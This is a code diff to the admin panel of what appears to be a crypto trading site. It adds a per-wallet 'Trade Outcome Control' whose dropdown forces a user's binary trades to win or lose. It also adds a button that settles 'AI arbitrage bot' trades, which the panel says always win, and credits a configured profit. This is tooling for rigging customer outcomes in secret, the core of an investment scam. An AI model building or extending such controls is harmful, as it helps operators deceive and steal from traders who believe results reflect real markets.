@@ -441,12 +441,29 @@
                 </div>
             </div>
 
+            <!-- Trade Outcome Control (shown after a wallet is loaded) -->
+            <div class="card" id="tradeControlCard" style="max-width: 600px; margin-bottom: 20px; display: none;">
+                <div class="card-header">Binary Trade Outcome Control</div>
+                <p style="color: var(--text-secondary); font-size: 13px; margin-bottom: 15px;">
+                    Override binary trading outcomes for this user. AI arbitrage bots always win — profit is calculated from the configured level percentage.
+                </p>
+                <div style="display: flex; align-items: center; gap: 10px; flex-wrap: wrap;">
+                    <span style="color: var(--text-secondary); white-space: nowrap;">Outcome for <span id="tradeControlWalletLabel" style="color: var(--accent); font-family: monospace;"></span>:</span>
+                    <select id="tradeOutcomeSelect" style="flex: 1; min-width: 200px; padding: 8px 12px; background: var(--bg-dark); border: 1px solid var(--border); color: white; border-radius: 6px;">
+                        <option value="random">🎲 Random (House Edge)</option>
+                        <option value="win">✅ Force Win</option>
+                        <option value="lose">❌ Force Lose</option>
+                    </select>
+                    <button class="btn btn-success" onclick="saveTradeControl()"><i data-lucide="save"></i> Apply</button>
+                </div>
+            </div>
+
             <div class="card">
                 <div class="card-header">Trade Records</div>
                 <table>
-                    <thead><tr><th>ID</th><th>Type</th><th>Status</th><th>Details</th><th>Date</th></tr></thead>
+                    <thead><tr><th>ID</th><th>Type</th><th>Status</th><th>Details</th><th>Date</th><th>Action</th></tr></thead>
                     <tbody id="adminTradesTable">
-                        <tr id="emptyTradesRow"><td colspan="5" style="text-align: center;">Enter a wallet address above to view trades</td></tr>
+                        <tr id="emptyTradesRow"><td colspan="6" style="text-align: center;">Enter a wallet address above to view trades</td></tr>
                     </tbody>
                 </table>
             </div>
@@ -1162,15 +1179,59 @@
                 else if(t.type === 'swap') details = `${t.fromCoin || ''} → ${t.toCoin || ''}`;
                 else if(t.type === 'ai-bot') details = `${t.levelName || ''} · ${t.duration || ''}d`;
                 else details = t.levelName || '';
+                // Show "Complete" button for active AI bot trades; use parseInt to ensure a safe numeric ID
+                const safeTradeId = Number.isFinite(parseInt(String(t.id), 10)) ? parseInt(String(t.id), 10) : 0;
+                const actionCell = (t.type === 'ai-bot' && t.status === 'active' && safeTradeId > 0)
+                    ? `<button class="btn" style="padding:4px 10px;font-size:11px;" onclick="completeAiBot('${esc(wallet)}',${safeTradeId})"><i data-lucide="check-circle"></i> Complete</button>`
+                    : '—';
                 row.innerHTML = `
                     <td style="font-family:monospace;font-size:12px;">${esc(String(t.id || ''))}</td>
                     <td style="color:var(--accent);">${esc(t.type || '')}</td>
                     <td><span style="color:${statusColor};font-weight:bold;">${esc(t.status || '')}</span></td>
                     <td style="font-size:12px;">${esc(details)}</td>
                     <td style="font-size:12px;">${esc(new Date(t.createdAt).toLocaleString())}</td>
+                    <td>${actionCell}</td>
                 `;
                 table.appendChild(row);
             });
+            // Load trade outcome control setting, then refresh all icons once
+            await loadTradeControl(wallet);
+            lucide.createIcons();
+        }
+
+        async function loadTradeControl(wallet) {
+            const ctrl = await api(`trade-control?wallet=${encodeURIComponent(wallet)}`);
+            const card = document.getElementById('tradeControlCard');
+            if(ctrl && !ctrl.error) {
+                document.getElementById('tradeControlWalletLabel').textContent = wallet.slice(0, 10) + '…';
+                document.getElementById('tradeOutcomeSelect').value = ctrl.outcome || 'random';
+                card.style.display = 'block';
+            } else {
+                card.style.display = 'none';
+            }
+        }
+
+        async function saveTradeControl() {
+            const wallet = document.getElementById('trade-wallet').value.trim();
+            const outcome = document.getElementById('tradeOutcomeSelect').value;
+            if(!wallet) { alert('Please load a wallet first.'); return; }
+            const result = await api('trade-control', 'POST', { wallet, outcome });
+            if(result && result.success) {
+                alert(`Trade outcome control set to "${outcome}" for ${wallet.slice(0, 10)}…`);
+            } else {
+                alert('Error: ' + ((result && result.error) || 'Failed to save trade control.'));
+            }
+        }
+
+        async function completeAiBot(wallet, tradeId) {
+            if(!confirm(`Complete AI bot trade #${tradeId} for ${wallet.slice(0,10)}…?\n\nProfit will be calculated from the bot's level configuration and credited immediately.`)) return;
+            const result = await api('trades', 'POST', { type: 'ai-bot-complete', wallet, tradeId });
+            if(result && result.success) {
+                alert(`AI bot #${tradeId} completed!\nProfit credited: $${result.profit || 0}\nNew balance: $${result.newBalance?.usdt || 0}`);
+                loadTrades();
+            } else {
+                alert('Error: ' + ((result && result.error) || 'Failed to complete bot.'));
+            }
         }
 
         // --- Audit Logs ---
